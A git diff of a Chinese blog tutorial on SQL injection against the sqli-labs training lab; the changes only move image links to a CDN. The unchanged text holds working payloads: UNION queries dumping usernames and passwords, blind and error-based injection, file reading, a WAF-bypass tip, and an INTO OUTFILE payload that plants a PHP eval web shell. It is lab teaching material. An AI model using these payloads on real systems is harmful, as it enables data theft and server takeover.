@@ -13,7 +13,7 @@
     <meta name="description" content="ezy-blog,mysql的目录结构mysql 5.0以上的版本中，默认定义了$\color{red}{information}$_$\color{red}{schema}$数据库，其中包含有表$\color{re,"> 
     <meta name="author" content="ezy"> 
     
-    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/config_images/favicon.png"> 
     <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
     
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
@@ -55,7 +55,7 @@
 <div id="top" style="display: block;">
     <div class="bar" style="width: 0;"></div>
     <div class="navigation animated fadeIn fast delay-1s">
-        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://ezysec.cn">
+        <img id="home-icon" class="icon-home" src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/config_images/favicon.png" alt="" data-url="http://ezysec.cn">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
         <h3 class="subtitle">基于sqli_lab的sql注入详解(一)</h3>
         <div class="social">
@@ -82,7 +82,7 @@
             animation-duration: 1.2s;
             background-image: 
                 radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url(/img/cover.jpg) ">
+                url(https://cdn.jsdelivr.net/gh/ezy0812/CDN/config_images/cover.jpg) ">
         </div>
         <div class="else">
             <p class="animated fadeInDown">
@@ -99,13 +99,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    9.8k
+                    11k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    9 mins.
+                    10 mins.
                 </span>
                 
                 
@@ -156,13 +156,13 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h2><h3 id="以less-1为例"><a href="#以less-1为例" class="headerlink" title="以less-1为例"></a>以less-1为例</h3><p><img src="/images/images_of_sql_injection/mysql_injection_f1.png" alt="">   </p>
+<h2 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h2><h3 id="以less-1为例"><a href="#以less-1为例" class="headerlink" title="以less-1为例"></a>以less-1为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f1.png" alt="">   </p>
 <h3 id="这里提示输入ID作为参数值，那输入一下试试看"><a href="#这里提示输入ID作为参数值，那输入一下试试看" class="headerlink" title="这里提示输入ID作为参数值，那输入一下试试看"></a>这里提示输入ID作为参数值，那输入一下试试看</h3><pre><code class="http">http://127.0.0.1/sqli/Less-1/?id=1</code></pre>
-<h3 id="返回结果1"><a href="#返回结果1" class="headerlink" title="返回结果1"></a>返回结果1</h3><p><img src="/images/images_of_sql_injection/mysql_injection_f2.png" alt=""></p>
+<h3 id="返回结果1"><a href="#返回结果1" class="headerlink" title="返回结果1"></a>返回结果1</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f2.png" alt=""></p>
 <h3 id="Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入"><a href="#Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入" class="headerlink" title="Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入"></a>Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入</h3><pre><code class="http">http://127.0.0.1/sqli/Less-1/?id=1&#39;</code></pre>
-<h3 id="返回结果2"><a href="#返回结果2" class="headerlink" title="返回结果2"></a>返回结果2</h3><p><img src="/images/images_of_sql_injection/mysql_injection_f3.png" alt="">  </p>
+<h3 id="返回结果2"><a href="#返回结果2" class="headerlink" title="返回结果2"></a>返回结果2</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f3.png" alt="">  </p>
 <blockquote>
-<p><strong>‘’1’’ LIMIT 0,1’</strong><br>观察报错语句，去掉最外层的引号，它是将从sql查询语句错误的地方开始用引号引起来，到语句结束处引号结束<br>去掉引号之后，变为 <strong>‘1’’ LIMIT 0,1</strong><br>我们对ID的赋值为  <strong>1’</strong><br>所以可以猜到查询语句对ID的查询是单引号包起来<br>这里可以看一下PHP源码<br><img src="/images/images_of_sql_injection/mysql_injection_f4.png" alt=""><br>可以看出ID确实是被单引号包裹起来的  </p>
+<p><strong>‘’1’’ LIMIT 0,1’</strong><br>观察报错语句，去掉最外层的引号，它是将从sql查询语句错误的地方开始用引号引起来，到语句结束处引号结束<br>去掉引号之后，变为 <strong>‘1’’ LIMIT 0,1</strong><br>我们对ID的赋值为  <strong>1’</strong><br>所以可以猜到查询语句对ID的查询是单引号包起来<br>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f4.png" alt=""><br>可以看出ID确实是被单引号包裹起来的  </p>
 </blockquote>
 <h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><ol>
 <li><p>检测字段数  </p>
@@ -172,26 +172,26 @@
 <li>order by 4 返回错误</li>
 <li>所以为3个字段  </li>
 </ul>
-<p><img src="/images/images_of_sql_injection/mysql_injection_f5.png" alt="">  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f5.png" alt="">  </p>
 </li>
 <li><p>检测当前数据库的表名</p>
 <pre><code class="http">http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,3 --+</code></pre>
 <ul>
 <li>因为前面检测出了3个字段，所以Union select 1,2,3</li>
-<li>$\color{red}{返回结果}$<br><img src="/images/images_of_sql_injection/mysql_injection_f6.png" alt=""> </li>
+<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f6.png" alt=""> </li>
 <li>可以看出数字2和3在页面显示出来了，所以选择在2或者3上注入</li>
 </ul>
 <pre><code class="http">http://127.0.0.1/sqli/Less-1/?id=-1&#39; UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre>
 <ul>
 <li>使用union select语句要注意$\color{red}{前面的条件不能成立，可赋id=-1}$</li>
-<li>$\color{red}{返回结果}$<br><img src="/images/images_of_sql_injection/mysql_injection_f7.png" alt=""></li>
+<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f7.png" alt=""></li>
 </ul>
 </li>
 <li><p>检测某一个表的列名</p>
 <pre><code class="http">http://127.0.0.1/sqli/Less-1/?id=-1&#39; UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre>
 <ul>
 <li>记得表名要加单引号包裹起来</li>
-<li>$\color{red}{返回结果}$<br><img src="/images/images_of_sql_injection/mysql_injection_f8.png" alt=""></li>
+<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f8.png" alt=""></li>
 </ul>
 </li>
 </ol>
@@ -200,7 +200,7 @@
 <pre><code class="http">http://127.0.0.1/sqli/Less-1/?id=-1&#39; UNION ALL SELECT 1,group_concat(username,0x3a,password),3 from users --+</code></pre>
 <ul>
 <li>0x3a表示引号，可以分开用户名和密码</li>
-<li>$\color{red}{返回结果}$<br><img src="/images/images_of_sql_injection/mysql_injection_f9.png" alt=""></li>
+<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f9.png" alt=""></li>
 </ul>
 </li>
 </ol>
@@ -209,19 +209,19 @@
 <li>#或–+或/**/ </li>
 </ul>
 <h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><ul>
-<li>在注释的开头处加上！便可执行mysql语句，只对mysql有效，常用来绕过WAF<br><img src="/images/images_of_sql_injection/mysql_injection_f10.png" alt=""><br><img src="/images/images_of_sql_injection/mysql_injection_f11.png" alt=""></li>
+<li>在注释的开头处加上！便可执行mysql语句，只对mysql有效，常用来绕过WAF<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f10.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f11.png" alt=""></li>
 </ul>
 <hr>
-<h2 id="基于时间的延时注入"><a href="#基于时间的延时注入" class="headerlink" title="基于时间的延时注入"></a>基于时间的延时注入</h2><h3 id="以less-9为例"><a href="#以less-9为例" class="headerlink" title="以less-9为例"></a>以less-9为例</h3><p><img src="/images/images_of_sql_injection/mysql_injection_f12.png" alt=""> </p>
+<h2 id="基于时间的延时注入"><a href="#基于时间的延时注入" class="headerlink" title="基于时间的延时注入"></a>基于时间的延时注入</h2><h3 id="以less-9为例"><a href="#以less-9为例" class="headerlink" title="以less-9为例"></a>以less-9为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f12.png" alt=""> </p>
 <ul>
 <li>测试id参数发现不管是否加引号都会返回相同的结果，所以无法使用报错注入</li>
-<li>这里可以看一下PHP源码<br><img src="/images/images_of_sql_injection/mysql_injection_f14.png" alt="">  </li>
+<li>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f14.png" alt="">  </li>
 </ul>
 <h3 id="利用if语句，若真则返回1，若假则延时3s"><a href="#利用if语句，若真则返回1，若假则延时3s" class="headerlink" title="利用if语句，若真则返回1，若假则延时3s"></a>利用if语句，若真则返回1，若假则延时3s</h3><p>$\color{red}{真，时间为2s左右}$  </p>
 <pre><code class="http">http://127.0.0.1/sqli/Less-9/?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(3)) --+</code></pre>
-<p><img src="/images/images_of_sql_injection/mysql_injection_f13.png" alt=""><br>$\color{red}{假，时间为5s左右}$  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f13.png" alt=""><br>$\color{red}{假，时间为5s左右}$  </p>
 <pre><code class="http">http://127.0.0.1/sqli/Less-9/?id=1&#39; and if(ascii(substr(database(),1,1))=116,1,sleep(3)) --+</code></pre>
-<p><img src="/images/images_of_sql_injection/mysql_injection_f15.png" alt="">   </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f15.png" alt="">   </p>
 <blockquote>
 <ul>
 <li>注意payload要加and</li>
@@ -230,7 +230,7 @@
 <hr>
 <h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="以less-8为例"><a href="#以less-8为例" class="headerlink" title="以less-8为例"></a>以less-8为例</h3><pre><code class="http">http://127.0.0.1/sqli/Less-8/?id=1&#39;</code></pre>
 <ul>
-<li>加单引号发现错误界面<br><img src="/images/images_of_sql_injection/mysql_injection_f16.png" alt=""> </li>
+<li>加单引号发现错误界面<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f16.png" alt=""> </li>
 </ul>
 <h3 id="利用返回的布尔值注入"><a href="#利用返回的布尔值注入" class="headerlink" title="利用返回的布尔值注入"></a>利用返回的布尔值注入</h3><h4 id="返回错误界面"><a href="#返回错误界面" class="headerlink" title="返回错误界面"></a>返回错误界面</h4><pre><code class="http">http://127.0.0.1/sqli/Less-8/?id=1&#39; and length(database()) &lt; 8 --+</code></pre>
 <h4 id="返回正确界面"><a href="#返回正确界面" class="headerlink" title="返回正确界面"></a>返回正确界面</h4><pre><code class="http">http://127.0.0.1/sqli/Less-8/?id=1&#39; and length(database()) &lt; 9 --+</code></pre>
@@ -238,33 +238,33 @@
 <h2 id="mysql读文件"><a href="#mysql读文件" class="headerlink" title="mysql读文件"></a>mysql读文件</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul>
 <li>权限够高</li>
 <li>secure_file_priv不为NULL，需要通过my.ini修改<blockquote>
-<p><img src="/images/images_of_sql_injection/mysql_injection_f17.png" alt=""><br>$\color{red}{设置为空格即可}$<br><img src="/images/images_of_sql_injection/mysql_injection_f18.png" alt=""><br><img src="/images/images_of_sql_injection/mysql_injection_f19.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f17.png" alt=""><br>$\color{red}{设置为空格即可}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f18.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f19.png" alt=""></p>
 </blockquote>
 </li>
 </ul>
 <h3 id="以less-1为例进行读文件"><a href="#以less-1为例进行读文件" class="headerlink" title="以less-1为例进行读文件"></a>以less-1为例进行读文件</h3><pre><code class="http">http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,load_file(&#39;F:\\flag.txt&#39;),3 --+</code></pre>
-<p><img src="/images/images_of_sql_injection/mysql_injection_f20.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f20.png" alt=""></p>
 <hr>
 <h2 id="mysql写文件"><a href="#mysql写文件" class="headerlink" title="mysql写文件"></a>mysql写文件</h2><h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><ul>
 <li>权限够高</li>
 <li>设置变量general_log为ON<blockquote>
-<p><img src="/images/images_of_sql_injection/mysql_injection_f21.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f21.png" alt=""></p>
 </blockquote>
 </li>
 </ul>
-<h3 id="以less-7为例"><a href="#以less-7为例" class="headerlink" title="以less-7为例"></a>以less-7为例</h3><h4 id="正确界面"><a href="#正确界面" class="headerlink" title="正确界面"></a>正确界面</h4><p><img src="/images/images_of_sql_injection/mysql_injection_f22.png" alt=""></p>
+<h3 id="以less-7为例"><a href="#以less-7为例" class="headerlink" title="以less-7为例"></a>以less-7为例</h3><h4 id="正确界面"><a href="#正确界面" class="headerlink" title="正确界面"></a>正确界面</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f22.png" alt=""></p>
 <h4 id="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"><a href="#反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面" class="headerlink" title="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"></a>反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面</h4><pre><code class="http">http://127.0.0.1/sqli/Less-7/?id=1&#39;)) --+</code></pre>
 <h4 id="可以写入一句话，然后使用蚁剑连接"><a href="#可以写入一句话，然后使用蚁剑连接" class="headerlink" title="可以写入一句话，然后使用蚁剑连接"></a>可以写入一句话，然后使用蚁剑连接</h4><pre><code class="http">http://127.0.0.1/sqli/Less-7/?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;ezy&quot;]);?&gt;&#39; into outfile &quot;F:\\phpstudy_pro\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php&quot; --+</code></pre>
-<p><img src="/images/images_of_sql_injection/mysql_injection_f23.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f23.png" alt=""></p>
 <hr>
-<h2 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h2><h3 id="以less-5为例"><a href="#以less-5为例" class="headerlink" title="以less-5为例"></a>以less-5为例</h3><p><img src="/images/images_of_sql_injection/mysql_injection_f24.png" alt=""></p>
+<h2 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h2><h3 id="以less-5为例"><a href="#以less-5为例" class="headerlink" title="以less-5为例"></a>以less-5为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f24.png" alt=""></p>
 <h3 id="利用-floor-rand-group-by进行报错注入"><a href="#利用-floor-rand-group-by进行报错注入" class="headerlink" title="利用 floor(),rand(),group by进行报错注入"></a>利用 floor(),rand(),group by进行报错注入</h3><pre><code class="http">http://192.168.0.104/sqli/Less-5/?id=0&#39; union select 1,2,count(*)  from information_schema.columns group by concat((select table_name from information_schema.tables where table_schema = database() limit 3,1),0x3a,floor(rand(0)*2)) --+</code></pre>
 <blockquote>
 <ul>
 <li>注意只能返回一行数据，所以使用limit</li>
 </ul>
 </blockquote>
-<h4 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h4><p><img src="/images/images_of_sql_injection/mysql_injection_f25.png" alt=""></p>
+<h4 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f25.png" alt=""></p>
 <blockquote>
 <ul>
 <li>通过改变payload爆出其他数据</li>
@@ -280,7 +280,7 @@
             <ul id="audio-list" style="display:none">
                 
                 
-                <li title='0' data-url='/statics/Bloom.mp3'></li>
+                <li title='0' data-url='https://cdn.jsdelivr.net/gh/ezy0812/CDN-music/Bloom.mp3'></li>
                 
                     
             </ul>
@@ -291,7 +291,7 @@
         <div class="sidebar">
             <div class="box animated fadeInRight">
                 <div class="subbox">
-                    <img src="/img/ezy.jpg" height=300 width=300></img>
+                    <img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/config_images/ezy.jpg" height=300 width=300></img>
                     <p>ezy</p>
                     <span>What's the feeling of loving someone? Like a dog, like a god</span>
                     <a href="https://github.com/ezy0812" target="_blank"><span
